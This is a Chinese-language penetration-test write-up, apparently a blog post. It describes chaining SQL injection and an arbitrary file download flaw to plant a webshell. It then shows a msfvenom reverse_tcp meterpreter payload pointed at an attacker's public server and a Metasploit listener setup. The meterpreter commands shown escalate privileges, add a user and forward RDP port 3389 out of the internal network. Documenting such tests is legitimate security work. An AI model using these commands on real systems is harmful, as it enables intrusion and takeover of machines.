## 漏洞探测

登录进后台测试发现两个系统均存在sql注入。

还在8000端口上的crocus系统中找到一处任意文件下载漏洞。

![](../Images/26fde870fc67cea2d6ef305c9ee08103.png)

原来是日志下载。点击发现页面中存在绝对路径。

![](../Images/098b92605d05818b4b59f070fb46bfbe.png)

OK！！！收集一下绝对路径。

![](../Images/8c6b0d45e45d78b5db648f3b4346a41c.png)

**现在的思路是：在有绝对路径的前提下，配合sql注入，利用sqlmap的—sql-shell尝试可以写一句话木马。**

## 控制服务器

先收集一下该服务器的信息

![](../Images/e61747d8fb2671399b1544bd217ad04b.png)

![](../Images/932b304129f8277e08a12bebad93669e.png)

该服务器运行在内网，这里选择使用msf马反弹shell后进行端口转发。

关于如何在外网打造一台metasploit。推荐文章：

http://www.sqlsec.com/2018/03/cloud.html#more

生成msf马

```
msfvenom -p  windows/x64/meterpreter/reverse\_tcp  LHOST=xx.xx.xx.xx  LPORT=2333  -f  exe >  road.exe
```

*xx.xx.xx.xx**为公网服务器，**2333**为公网端口。*

**![](../Images/7f208b553dae986a1d0673e34f1c8457.png)**

将生成的msf马通过中国菜刀上传至肉鸡。

外网metasploit开始配置监听

> use  exploit/multi/handle
> 
> set  payload windows/x64/meterpreter/reverse\_tcp
> 
> set lhost 127.0.0.1
> 
> run

![](../Images/18edd9c996eb911dae5753947c2e9be6.png)

  

![](../Images/76268fbe3467a88590d1688a1a509dc2.png)

简单执行几条meterpreter命令

> getuid  当前权限
> 
> getsystem 进行提权
> 
> run  getgui  -u xxxxx  -p  xxxxx  可以在目标机器上添加用户
> 
> portfwd add -l  3389  -r  192.168.1.18  -p  3389  将3389端口转发至本地

端口转发连接本地的3389

## 总结

这次项目成功getshell主要利用了高位端口扫描、弱口令、SQL注入、文件下载漏洞。愿每次渗透测试都会遇到不一样的自己。
